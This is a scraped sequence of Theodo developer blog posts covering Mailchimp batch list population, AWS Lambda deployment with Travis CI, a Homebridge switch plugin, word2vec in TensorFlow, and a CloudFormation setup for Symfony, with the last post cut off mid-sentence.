Sound Redux, a popular open-source React project, we time npm install on a 2017 MacBook Pro:\nIt will take 41s if node_modules is synced to the host, and only 14s if not (a 3x improvement)\nWith Sentry (the crash reporting platform), we go from 1mn30 to 26s (a 5x improvement)\nFinally, on my own project using Angular and an older version of npm, we go from 9mn to 3mn (a 3x improvement).\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tIvan Poiraudeau\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nMailchimp is a marketing tool that lets your marketing department have autonomy to control their own marketing emails. As developers, we can also use the flexible API for custom integrations. When we combine the two, we get a powerful and flexible tool that allows for complex marketing campaigns that are specific to product needs.\nA key Mailchimp feature is lists \u2013 these are a collection of customers that receive your marketing campaigns. Each customer in the list can have a number of properties, called merge fields that use to assign additional data to each customer. These properties can then be rendered in emails, or used to segment the customers to send campaigns to a specific subset of our list.\nThe common use case for Mailchimp is having one list for all of your customers, using segments to send specific campaigns. We can specify a segment that has a date of birth in august, or everybody called John to target them specifically. However, when you would like to segment your customers in a more complex manor \u2013 such as customers who behave in a particular way on your application the previous day, mailchimp leaves you stuck.\nWe could have merge field that indicates whether a customer is eligible for inclusion in a segment, however we are unable to segment based on relative dates such as yesterday. To solve this, we generate our own list and the integrated API to populate with the customers we want. We all we need to do in Mailchimp is set up an automated campaign mail to send out daily to the automatically populated list.\nSetting up\nYou\u2019ll first need a Mailchimp account, and API key (which can be generated in the user settings for your application). You\u2019ll then need to create the list on mailchimp, use the GUI on the site as its much easier than the API. Leave the merge fields empty for now, we will come back to them later.\nWe connect to the api using the python package mailchimp3. For this example, we\u2019ll assume we have a customer and activity models \u2013 where customers can have many activities. Firstly we need to configure mailchimp3, to generate the api client we write the following:\nfrom mailchimp3 import MailChimp\r\nfrom django.conf import settings\r\n\r\nclient = MailChimp(MAILCHIMP_USERNAME, MAILCHIMP_API_KEY)\r\n\nWe can then check out what lists we have by running:\nclient.lists.all(get_all=True, fields=\"lists.name,lists.id\")\r\n\nThis will return the names and IDs for all of the lists our account has. Now take note of the list ID you want to dynamically update \u2013 we\u2019ll refer to this list ID as MAILCHIMP_LIST_ID.\nCreating the extract\nThe first step is to create an extract which contains all the customers and relevant merge fields for the Mailchimp list. This is very business specific and can be as complex as you like. We use a simple example that returns all the customers who had an activity longer than 5 minutes yesterday:\nfrom app.models import Activity\r\nfrom django.utils.timezone import timedelta, now\r\n\r\ndef generate_extract(duration):\r\n\r\n    kwargs = {\r\n        'activity_date': now() - timedelta(days=1)\r\n        'activity_duration': 300\r\n    }\r\n    return Activity.objects.filter(**kwargs) \\\r\n        .select_related('customer') \\\r\n        .distinct('email')\r\n\nNow have a function that gets us our list of members, we need to transform them into a format that Mailchimp is expecting. The Mailchimp API lets us chose between making a request for each member we want to add, or to batch the requests into a single request. We choose the later implementation as we will be adding many customers to the list at a single time.\nSending to Mailchimp\nThe batch endpoint expects a list of operations that are in the mailchimp API format. For adding users to a list that is a POST request to /lists/MAILCHIMP_LIST_ID/members, with the body of each request being JSON in the following format:\n{\r\n    'status': 'subscribed',\r\n    'email_address': 'xxx@gmail.com',\r\n    'merge_fields': {\r\n        field_1: xxx\r\n        ...\r\n    }\r\n}\r\n\nWhere we can pass as many or as few merge fields as we like.\nGiven this, we need to create a function that takes a single customer model and returns an dict in this format with the merge_fields key containing an object with all the merge fields we want to include for our list! We can sends different types of data here, strings, numbers and dates for example.\ndef customer_to_mailchimp_member(customer):\r\n\r\n    return {\r\n        'status': 'subscribed',\r\n        'email_address': 'xxx@gmail.com',\r\n        'merge_fields': {\r\n            FIRSTNAME: customer.first_name,\r\n            LASTNAME: customer.last_name,\r\n            DOB: customer.date_of_birth\r\n        }\r\n    }\r\n\nNow we have this transformation function, we can apply it to every customer to create a list of members ready to upload.\nConfiguring the list\nThe next step is configure the mailchimp list to match all of the merge fields we want to include with our users. Mailchimp provides an easy to use interface to set this up, in the settings of your list under List fields and |* merge *| tags. Here you\u2019ll need to specify the type of each merge field, and ensure the merge tag exactly matches the key in the merge_fields object from the customer transformer.\nAfter the settings are configured, all that remains is to upload the users.\nUploading\nNext we need to create a list of operations that make the POST request to our Mailchimp list endpoint. We write the following general for adding members already in a format ready to upload, given a list:\ndef batch_add_members_to_list(members, list_id):\r\n\r\n    operations = [{\r\n        'method': 'POST',\r\n        'path': '/lists/' + list_id + '/members',\r\n        'body': json.dumps(member)\r\n    } for member in members]\r\n\r\n    client.batches.create(data={'operations': operations})\r\n\nHere we see that we construct a list of operations in a standard format to send to the endpoint, then we use the API client to make a single request which contains all of our operations. When Mailchimp receives this, it creates a new batch object attached to our account and returns the batch ID amongst other information about the newly created batch.\nManaging batches\nOnce you send a batch to Mailchimp it may take some time to execute the operations contained in the request. You can track the progress of a batch using:\nclient.batches.get(BATCH_ID)\r\n\nThis will return an object that tells you the status of the batch, which is pending when it is queued, started once Mailchimp has begun executing the operations and finished once it is complete. Once the batch has finished the response object will tell us how many operations completed, and how many failed. Further, we can get the results of all the operations contained within from the response_body_url object \u2013 this is a link to a JSON array of responses for each operations request.\nOnce a batch is complete, you can view the members added to the list! Alternatively, if it hasn\u2019t worked for you, you can debug using the batch management mentioned above.\n\nTo automatically add customers to our list, we use a webbook in our application that is called from an AWS lambda function at a specific time. The webhook then generates the customers and adds them to our Mailchip list using the method outlined above.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJosh Warwick\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThe purpose of this tutorial is to automatically deploy a serverless API with two deployment environments (development and production) from scratch. Using the Amazon Web Services (AWS), this will be a matter of minutes! We will use Node.js and several tools which all come with a freemium model:\n\nAWS Lambdas are functions in the cloud that can be triggered without bothering with the infrastructure. You upload your code to AWS and it can be run anytime with high availability on any of their servers. Need more resources? No problem, Amazon scales for you. Idle time? Don\u2019t pay for it anymore, you only pay when your API is called.\nAWS API Gateway helps you manage and version APIs and makes it easy to connect incoming requests with Lambda functions.\nTravis CI enables you to automatically test and deploy your code from Github.\nYou can as well use any other continuous integration (CI) tool, such as CircleCI.\n\nA repo with all needed scripts is available on my Github, but I will walk you through the three main steps to setup your API:\n\nhave a working application online running the code of your choice,\nmake continuous deployment happen: let any change of your code on Github automatically deploy to the API,\ndeal with several environments: one for production, one for development.\n\nSetup your Lambda and your API\nFirst set up an account on AWS. It needs up to 24 hours to be authorized. You may have to enter your credit card details, but no worries: AWS Lambda\u2019s free tier includes among other things 1 million free requests per month!\nYour first Lambda\nTo begin with, we\u2019re going to set up our very first Lambda function. On the upper panel of the AWS management console, select Lambda > Create a Lambda function > Blank function.\nIn the true tradition of computer programs, our application will output a fancy \u2018Hello world\u2019. When you\u2019re asked to type in the function code, use a hello-world template. It follows the callback logic that Lambda functions use:\nexports.handler = (event, context, callback) => {\r\n  callback(null, {\r\n    Hello: 'World'\r\n  });\r\n};\r\n\nYour first API\nFor the next operations, you\u2019ll need to go to the Amazon API Gateway and create a Hello World API from scratch (Create API > New API). Create a /hello-world resource (Actions > Create resource) and a GET method linked to our freshly created Lambda function (Actions > Create method > Integration type: Lambda function).\nYou\u2019ll notice that the Amazon console is pretty intuitive. If you get stuck however, I strongly recommend you this excellent walkthrough on building an API to expose a lambda function. AWS resources are particularly well-made and fully comprehensive, so don\u2019t hesitate to go through the documentation.\nSee your app in production!\nLet\u2019s deploy our work in production! On the API Gateway, go to Actions > Deploy API, create a production stage and\u2026 simply deploy by clicking the button.\nOn the stage editor screen, Amazon provides you with the invoke URL. Call your newly created API by typing said URL with the route /hello-world in your browser or use CURL to make a GET request.\nMake deployment automatic using Travis CI\nNow that the configuration is over, let\u2019s start with the code already! If you browse the project, you\u2019ll notice two main folders:\n\n./lambda contains the index.js with your function code as well as the Node dependencies in the package.json.\n./scripts contains the deployment script that Travis will use to update your function\u2019s code at each new commit.\n\nCreate these two folders : mkdir lambda && mkdir scripts\nI recommend you work on your own repository, so you learn to set it up by yourself. Begin by setting up a Git repository (git init) and a Node project with cd lambda && npm init -y.\nFill the code you want AWS to execute in ./lambda/index.js.\nDeployment script\nIn ./scripts/aws-lambda-deploy, you will write the code for automatically updating a Lambda function.\n\nIt loads all necessary packages including the node package for the AWS SDK and configure your region.\n\nconst AWS = require('aws-sdk');\r\nconst Promise = require('bluebird');\r\n\r\nconst lambda = new AWS.Lambda({\r\n  region: 'us-west-2'\r\n});\r\n\n\nIt zips the folder containing the Lambda function.\n\nconst cwd = process.cwd();\r\nconst zipLambdaCommand = `\r\n  cd ${cwd}/lambda/${lambdaName}/ &&\r\n  npm install --production &&\r\n  zip -r ${lambdaName}.zip * --quiet`;\r\n\n\nIt updates the Lambda function\u2019s code.\n\nconst lambdaUpdateFunctionCodeParams = {\r\n  FunctionName: `${lambdaName}`,\r\n  Publish: true,\r\n  ZipFile: read(`${cwd}/lambda/${lambdaName}/${lambdaName}.zip`)\r\n };\r\nlambdaUpdateFunctionCode(lambdaUpdateFunctionCodeParams);\r\n\nI prefer using promises instead of callbacks, so I promisify them using Bluebird. Then, all what the script does is chain both promises to zip und update the Lambda\u2019s code.\nI added a few console.log and also caught exceptions.\nTravis will then execute the script as stated in the travis.yml:\ndeploy:\r\n  - provider: script\r\n    script: node scripts/aws-lambda-deploy.js hello-world production\r\n    skip_cleanup: true\r\n    on:\r\n      branch: master\r\n\nSetup Travis CI\nOnce you have all your code on a repository on Github, it\u2019s easy to add it from Travis by going to your Travis profile and flicking the switch on corresponding to your repository. If you\u2019re a complete beginner with Travis, you may want to have a look to an introduction.\nTravis needs to be granted access to AWS in order to execute the deployment script. The two credentials that it needs to communicate with AWS (namely AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY) are to be found on the AWS console in My security credentials > Access keys. They are then stored in Travis as environment variables which you can set up and encrypt by clicking on Travis in More options > Settings.\nNow, each time you will commit your code, Travis will launch the tests and automate the deployment to AWS. Make a small change in your code, commit it and see by yourself what happens when browsing to the invoke URL of part 1.\nManage deployment environments\nMaking code deploy to AWS is really cool, but clearly not sufficient if you want to develop and test new ideas for your API. We\u2019d definitely need two environments: one for production and one for development, so your application is always available when you develop new features.\nConfigure two levels of code on the Lambda\nOn the Lambda console, at the lambda level, it is possible to configure aliases which will make the Lambda point to either production\u2019s or development\u2019s level of code.\nDo this by going to your lambda > Actions > Create alias, and create both production and development aliases, which should both point to a certain version of your code (e.g., version 1).\nConfigure two stages on the API\nOn the API Gateway console, in addition to the production stage, add a new stage to your API Gateway by clicking on your API > Stages > Create > Stage name: development.\nWe will use a stage variable to distinguish between production and development, and let the API trigger the Lambda with the corresponding alias. For both stages (production and development), set the NODE_ENV stage variables by navigating to the stage name > Stage variables > Add stage variable.\nType in NODE_ENV as name, and set a value of PRODUCTION for the production stage and DEVELOPMENT for the development stage.\nThe GET method shall now be edited in order to point to the requested stage. On the right panel, go to Resources > GET > Integration request > Lambda function and edit it. But this time, make sure you enter the name of your Lambda function concatenated with the alias: hello-world:${stageVariables.NODE_ENV}.\nNote: At this point, you will have to launch a command in order to extend your function\u2019s permissions.\nAmazon will kindly notify you by a popup, saying the API Gateway should be allowed to invoke the Lambda function. Configure your CLI and launch the said command for the functions hello-world:development and hello-world:production.\nBut how will the API Gateway pass this NODE_ENV variable? For that matter, you have to set the body mapping template by navigating to Add mapping template > application/json and enter the following code:\n#set($allParams = $input.params())\r\n  {\r\n    \"stageVariables\": {\r\n      #foreach($key in $stageVariables.keySet())\r\n        \"$key\" : \"$util.escapeJavaScript($stageVariables.get($key))\"\r\n        #if($foreach.hasNext),#end\r\n      #end\r\n    }\r\n  }\r\n\nDeploy on each environment\nIn addition to updating the Lambda\u2019s code, the deployment script shall also update the alias corresponding to the git branch that is being changed.\nconst lambdaUpdateAliasParams = {\r\n  FunctionName: `${lambdaName}`,\r\n  Name: lambdaAlias,\r\n  FunctionVersion: lambdaVersion\r\n};\r\nlambdaUpdateAlias(lambdaUpdateAliasParams);\r\n\nOn Git, each deployment environment corresponds to a certain branch. The branch master will deploy to production, and the branch develop to development. This appears in the travis.yml where we now automate the deployment for both environments:\n  - provider: script\r\n    script: node scripts/aws-lambda-deploy.js hello-world development\r\n    skip_cleanup: true\r\n    on:\r\n      branch: develop\r\n\nCreate the new branch for the development environment (git co -b develop), make a small change in the function\u2019s code, and push it to Github.\nWait for Travis to do its magic. You can check the deployment did not fail on Travis console. Once the build passed, if you go to the invoke URLs of each stage, you\u2019ll see the changes corresponding to each environment!\nConclusion\nAmazon provides you with a panel of services that integrate well with Lambda functions and the API Gateway. It goes from machine learning to logging tools or queuing services, and will help you in designing the best APIs. Possible future features for the API we just conceived are:\n\nhave different environment variables for each stage,\nencrypt the environment variables on AWS,\nschedule or define triggers to run your API at your convenience,\nmanage and organize logs.\n\nIn addition to that, many frameworks can now help you manage and deploy your Lambda web services, such as Serverless, Apex, or Zappa if you prefer using Python.\nIn serverless computing, you concentrate on coding simple functions instead of handling complex HTTP requests or focusing on architecture\u2019s issues. Automatic deployment, as we saw it, makes your application available for production and development in a few clicks. Making your own backend API and interacting with other APIs is a matter of minutes!\n\u00a0\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tPierre Marcenac\r\n  \t\t\t\r\n  \t\t\t\tWeb developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhy Homekit?\nHomekit is a home accessories management framework developed by Apple.\nIt allows Apple devices\u2019 owners to control connected objects from different manufacturers using a single interface. It enhances Siri\u2019s capability to interpret commands intended for those devices.\nHomekit is particularly interesting, over other connected objects protocols like Home Assistance, if you own an iPhone and an AppleTV. Homekit is native on iPhone, allowing easy control of your appliances through Home app and quick access tab. The apple TV will behave as a hub allowing you to set up automation tasks and to control your home from outside of your home network.\nHow does it work?\nHomekit Accessory Protocol\nHomekit defines a layout for your home and your connected objects.\n\nHome: A home represents a single dwelling that has a network of accessories\nRoom: Each home may have multiple rooms and accessories added to each room.\nPlatform: A group of accessories.\nAccessory: An accessory is a physical home automation device.\nBridge: A bridge is a special type of accessory that allows you to communicate with accessories that can\u2019t communicate directly with HomeKit. For example, a bridge might be a hub for multiple lights that use a communication protocol other than HomeKit Accessory Protocol.\nService: A service correspond to an accessory\u2019s function. A garage door may have a service to open and close the door as well as another service to turn on and off the garage light.\nCharacteristic: Each service has a set of properties called characteristics. The garage door has a Current Door State and a Target Door State boolean. Each characteristic of a service identifies its current state. Each characteristic has 3 permission levels: read, write and notify. You can find a list of services and associated characteristics here.\n\nEach request made using your iOS devices Home application or Siri will use this layout to understand which object you want to act on and what action you would like to trigger.\nHowever, as of today, only a small number of Homekit enabled devices are available on the market. For other devices, you need a proxy between Homekit and your device. Most connected object manufacturers define their own way to interact with their devices (API and protocols). Your proxy will receive Homekit requests and translate them according to your device interface.\nHomebridge\nThe proxy used for this article is a NodeJS server called Homebridge written using HAP-node.js. Homebridge instantiate a Bridge Homekit object that you will be able to add through your Home application on your iOS devices. It then supports Plugins, which are community-contributed modules that provide a basic bridge from HomeKit to each of your various \u201csmart home\u201d devices.\nMany home automation devices plugins have already been developed by the community (like Nest, Lifx and even all of Home Assistant compatible devices).\nIf no plugin is available today for your object, this tutorial is made for you.\n\nWritting your own plugin\nPrerequisites\n\nYou need to have Homebridge installed and running on any device of your LAN. You can follow these instructions.\nYou need to add Homebridge as an accessory to your Home application on iOS.\n\nInstructions\nLet\u2019s code a plugin for a fake switch.\nCreate a new repository containing a package.json file to manage our dependancies, and a index.js file that will contain our plugin core logic.\nWe will made the following assumption regarding our switch API:\n\nit can be controlled through a RESTful API over HTTP protocol on our LAN\nthe switch IP address on our LAN is 192.168.0.10\nGET requests made to /api/status returns a boolean representing switch current state. Doing so will read the On characteristic of the switch\nPOST requests made to /api/order containing a boolean representing the switch target state will trigger the corresponding action. Doing so will set the On characteristic of the switch\n\nWe will create a Homebridge plugin registering a new Accessory with two services:\n\nAccessoryInformation service, required for every accessory, whatever the type, broadcasting information related to the device itself\nSwitch service, corresponding to our actual switch. Such service has a single On boolean required characteristic (check the list of services and corresponding characteristics)\n\nFirst, we need to inject our plugin within homebridge.\nmySwitch is the javascript object that will contain our control logic.\n\r\nconst Service, Characteristic;\r\n\r\nmodule.exports = function (homebridge) {\r\n  Service = homebridge.hap.Service;\r\n  Characteristic = homebridge.hap.Characteristic;\r\n  homebridge.registerAccessory(\"switch-plugin\", \"MyAwesomeSwitch\", mySwitch);\r\n};\r\n\nThe core logic built within HAP-node.js and Homebridge is located wihtin the getServices prototype function of mySwitch object.\nWe will instanciate our services in this function. We will also define which getter and setter of each characteristic of each service it shall call on every requests received from Homekit.\nWe need to instanciate :\n\nan AccessoryInformation service containing:\n\na Manufacturer characteristic\na Model characteristic\na SerialNumber characteristic\n\n\na Switch service containing:\n\nan On characteristic \u2013 the only required characteristic of this service\n\n\n\nUnlike AccessoryInformation service\u2019s characteristics, which are readable and can be set at plugin initialization, the On characteristic is writable and require a getter and setter.\n\r\nmySwitch.prototype = {\r\n  getServices: function () {\r\n    let informationService = new Service.AccessoryInformation();\r\n    informationService\r\n      .setCharacteristic(Characteristic.Manufacturer, \"My switch manufacturer\")\r\n      .setCharacteristic(Characteristic.Model, \"My switch model\")\r\n      .setCharacteristic(Characteristic.SerialNumber, \"123-456-789\");\r\n\r\n    let switchService = new Service.Switch(\"My switch\");\r\n    switchService\r\n      .getCharacteristic(Characteristic.On)\r\n        .on('get', this.getSwitchOnCharacteristic.bind(this))\r\n        .on('set', this.setSwitchOnCharacteristic.bind(this));\r\n\r\n    this.informationService = informationService;\r\n    this.switchService = switchService;\r\n    return [informationService, switchService];\r\n  }\r\n};\r\n\nWe will now write the logic of On characteristic getter and setter within dedicated prototype function of mySwitch object.\nWe will make the following assumption regarding the RESTful API offered by the switch :\n\nGET requests on http://192.168.0.10/api/status returns a { currentState: } reflecting the switch current state\nPOST requests on http://192.168.0.10/api/order sending a { targetState: } reflecting desired target state set the switch state\n\nWe will use request and url modules to perform our HTTP requests.\nOur configuration object, defined within Homebridge global configuration JSON, will contain both URLs described above.\n\r\nconst request = require('request');\r\nconst url = require('url');\r\n\r\nfunction mySwitch(log, config) {\r\n  this.log = log;\r\n  this.getUrl = url.parse(config['getUrl']);\r\n  this.postUrl = url.parse(config['postUrl']);\r\n}\r\n\r\nmySwitch.prototype = {\r\n\r\n  getSwitchOnCharacteristic: function (next) {\r\n    const me = this;\r\n    request({\r\n        url: me.getUrl,\r\n        method: 'GET',\r\n    }, \r\n    function (error, response, body) {\r\n      if (error) {\r\n        me.log('STATUS: ' + response.statusCode);\r\n        me.log(error.message);\r\n        return next(error);\r\n      }\r\n      return next(null, body.currentState);\r\n    });\r\n  },\r\n  \r\n  setSwitchOnCharacteristic: function (on, next) {\r\n    const me = this;\r\n    request({\r\n      url: me.postUrl,\r\n      body: {'targetState': on},\r\n      method: 'POST',\r\n      headers: {'Content-type': 'application/json'}\r\n    },\r\n    function (error, response) {\r\n      if (error) {\r\n        me.log('STATUS: ' + response.statusCode);\r\n        me.log(error.message);\r\n        return next(error);\r\n      }\r\n      return next();\r\n    });\r\n  }\r\n};\r\n\nWe can now add our newly created plugin to Homebridge by installing it globally:\nnpm install -g switch-plugin\nOpen the config.json file located in your Homebridge directory in your favorite text editor. In the accessory section, add info to the array:\n\r\n{\r\n  \"accessory\": \"MyAwesomeSwitch\",\r\n  \"getUrl\": \"http://192.168.0.10/api/status\",\r\n  \"postUrl\": \"http://192.168.0.10/api/order\"\r\n}\r\n\nRestart Homebridge and you shall now be able to switch on and off this fake switch through Home app on your iOS device.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFr\u00e9d\u00e9ric Barthelet\r\n  \t\t\t\r\n  \t\t\t\tCurrently developing loopback applications at Theodo. Also crazy about IoT and everything connected.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhat is word vectorization?\nWord vectorization refers to a set of techniques that aims at extracting information from a text corpus and associating to each one of its word a vector. For example, we could associate the vector (1, 4, -3, 2) to the word king. This value is computed thanks to an algorithm that takes into account the word\u2019s context. For example, if we consider a context of size 1, the information we can extract from the following sentence:\nThe king rules his kingdom\nis a set of pairs:\n(the king), (king rules), (rules his), (his kingdom)\nIf we now consider another sentence:\nI see a king\nand the associated pairs:\n(I see), (see a), (a king)\nWe notice that we have 2 similar pairs across the 2 sets: (the king) and (a king)\nThe and a appear in the same context, so their associated vectors will tend to be similar.\nBy feeding the word vectorization algorithm a very large corpus (we are talking here about millions of words or more), we will obtain a vector mapping in which close values imply that the words appear in the same context and more generally have some kind of similarity, may it be syntactic or semantic.\nDepending on the text, we could have for example an area in the embedded space for programming languages, one for pronouns, one for numbers, and so on. I will give you a concrete example by the end of this article.\nOk, I get the concept, but why is it interesting?\nThis technique goes further than grouping words, it also enables algebraic operations between them. This is a consequence of the way the algorithm processes the text corpus. What it means is that you can do:\nking - man + woman\nand the result would be queen.\nIn other words, the word vectorization could have associated the following arbitrary values to the words below:\nking = (0, 1)\r\nqueen = (1, 2)\r\nman = (2, 1)\r\nwoman = (3, 2)\nAnd we would have the equality:\nking - man + woman = queen\r\n(0, 1) - (2, 1) + (3, 2) = (1, 2)\nIf the learning was good enough, the same will be possible for other relationships, like\nParis - France + Spain = Madrid\r\nfrontend + php - javascript = backend\nTo sum up, you can play with concepts by adding and subtracting them and get meaningful results from it, which is amazing!\nThe applications are multiple:\n\nYou can visualize the result by projecting the embedded space to a 2D space\nYou can use these vectors to feed another more ambitious machine learning algorithm (a neural network, a SVM, etc.). The ultimate goal is to allow machines to understand human language, not by learning it by heart but by having a structured representation of it, as opposed to more basic representations such as 1-hot-encoding like the following, where each dimension is a word:\n\nthe = (1, 0, 0, 0, 0, 0, 0)\r\na = (0, 1, 0, 0, 0, 0, 0)\r\nking = (0, 0, 1, 0, 0, 0, 0)\r\nqueen = (0, 0, 0, 1, 0, 0, 0)\r\nman = (0, 0, 0, 0, 1, 0, 0)\r\nwoman = (0, 0, 0, 0, 0, 1, 0)\r\nhis = (0, 0, 0, 0, 0, 0, 1)\nSounds great! Where do I start?\nThe tutorial below shows how to simply achieve and visualize a word vectorization using the Python Tensorflow library. For information I will use the Skip-gram model, which tends to learn faster than its counterpart the Continuous Bag-of-Words model. Detailing the difference is out of the scope of this article but don\u2019t hesitate to look it up if you want!\nI was curious about what I would get by running the algorithm with a text corpus made of all the articles from the Theodo blog, so I used the BeautifulSoup python library to gather the data and clean it. For information there are about 300 articles, each one containing an average of 1200 words, which is a total of 360 000 words. This is very little but enough to see some interesting results.\nStep 1: Build the dataset\nWe first need to load the data, for example from a file:\nfilename = 'my_text.txt'with open(filename, \"r+\") as f:\r\n    data = tf.compat.as_str(f.read())\nThen we strip it from its punctuation and split it in an array of words:\ndata = data.translate(None, string.punctuation)\r\ndata = data.split()\nAnd we homogenize the data:\nwords = []\r\nfor word in data:\r\n    if word.isalpha():\r\n        words.append(word.lower())\r\n    elif is_number(word):\r\n        words.append(word)\nThe data should now look like the following:\n[the, day, words, became, vectors, what, is, word, vectorization, ...]\nWe also need to adapt the data so it has the structure the algorithm expects. This begins to be a bit technical, so I advise you to use functions from the official word2vec examples you can find here. You should use the build_dataset\u00a0(line 66) function with as arguments the words array you built before and the size of the vocabulary you want. Indeed it is a good practice to remove the words that don\u2019t appear often, as they will slow down the training and they won\u2019t bring any meaningful result anyway.\nStep 2: Train the model\nNow that we have our dataset, we need to build our set of batches, or contexts, as explained previously, remember:\n(the king), (king rules), (rules, his), (his kingdom)\nTo do this, we use the generate_batch function.\nTo properly train the model, you can look at the end of the example (line 131)\u00a0. All parameters\u2019 purpose is detailed, but in my opinion the ones that are worth tweaking when you begin are:\n\nembedding_size: the dimension of the resulting vector depends on the size of your dataset. A dimension too small will reduce the complexity your embedded space can grasp, a dimension too big may hinder your training.\u00a0To start I recommend to keep the default value of 128.\nskip_window: the size of the context. It is safe to start with one, i.e. considering only neighbours, but I encourage you to experiment with higher values.\nnumber_of_steps: Depending on your corpus size and your machine CPU, you should adapt this if you don\u2019t want to wait too long for your results. For my corpus it took around 4 minutes to complete the 100 000 steps.\n\nStep 3: Analyze the results\nThe word2vec example lets us visualize the result by reducing the dimension from a very large value (128 if you stick to default) to 2D. For information it uses a t-SNE algorithm, which is well-suited for visualizing high-dimensional data as it preserves as much as possible the relative distance between neighbours.\nHere is the result I got:\n\n\u00a0\nIt is too dense to read, so see below an extract of what I got from my dataset:\n\u00a0\n\nWe can see we have an area with pronouns in the top, and one with auxiliaries to the left.\nThe relations highlighted just above were syntactic ones. On this other extract, we see semantic similarities:\n\u00a0\n\nThe algorithm learned that node is a backend framework!\nHowever with these few words, the model was not good enough to perform meaningful operations between vectors. I guess Theodoers need to write more blog articles to feed the word vectorization algorithm!\nYou can see below what word vectorization is capable of with this example coming from the Tensorflow page:\n\nConclusion\nI hope that I managed in this article to share my enthusiasm for the rise of word vectorization and all the crazy applications that could ensue! If you are interested, I encourage you to look at papers that treat this subject more deeply:\n\nA more complete implementation example with\u00a0Tensorflow\nYou can also dive into this Kaggle competition\u00a0that contains a lot of information about how to tackle a real use case\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAlexandre Blondin\r\n  \t\t\t\r\n  \t\t\t\tDevelopper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tI decided to follow an advice shared on twitter via the The Practical Dev: the best way to learn AWS is to start using it.\nThe problem\nI was looking for a way to quickly create a Minimum Viable Stack on AWS with the following\u00a0properties:\n\nBe setup in less than 10min\nBe able to run a Symfony application\nUsing PostgreSQL on RDS\nDeployment is easy and fast\nNon AWS experts can create the MVS\n\nBut I couldn\u2019t find any out-of-the-box tools so I looked for a solution. Here I describe my journey which ended up with a ready-to-go CloudFormation configuration.\nElastic Beanstalk\nI started working with Elastic Beanstalk,\u00a0the PAAS of AWS,\u00a0which seemed to be exactly what I needed. Thanks to\u00a0this article on Elastic Beanstalk configuration files and this one on how to deploy a Symfony application,\u00a0I was able to run my application after some debugging cycles. My problem after that was that I couldn\u2019t\u00a0reuse my\u00a0configuration to recreate the whole environment (Elastic Beanstalk instances + RDS instance) for a\u00a0new project so I chose to experiment using CloudFormation.\nCloudFormation\nCloudFormation is an AWS service that creates a complete stack (VPC, load balancers, web servers, ..) from a template file.If you want to learn how to use CloudFormation, I recommend you to start by learning the basic templates. I started from a sample Elastic Beanstalk template and changed it so it can run a Symfony App.\u00a0Here are the steps you need to perform in order to use my template:\nStep 1: Because we will pass to the Elastic Beanstalk server the information to connect to the RDS postgresql database through environment variables, you need to update your parameters.yml with the following values:\ndatabase_host: \"%env(DB_HOST)%\"\r\ndatabase_port: 5432\r\ndatabase_name: \"%env(DB_NAME)%\"\r\ndatabase_user: \"%env(DB_USER)%\"\r\ndatabase_password: \"%env(DB_PASSWORD)%\"\r\n\nStep 2: Ensure you have specified the driver to \u201cpdo_pgsql\u201d in the \u201capp/config/config.yml\u201d file.\nStep 3: Upload a zip file with all your code to a s3 bucket. You create the zip file with this command:\nzip -r code.zip . --exclude=*vendors*`\nStep 4: Download my CloudFormation template.\nStep 5: Go to your AWS\u00a0console and open the CloudFormation and click on \u201ccreate new stack\u201d.\nStep 6: Enter the required\u00a0information:\n\nStep 7: Click on \u201cnext\u201d, \u201cnext\u201d and check \u201cI acknowledge that AWS CloudFormation might create IAM resources.\u201d. Then you can click on create. If everything is fine then you should\u00a0see something like this:\n\nStep 8\u00a0: You can check\u00a0the Elastic Beanstalk page to see if everything went okay\u00a0and find the url of your project at the top of the 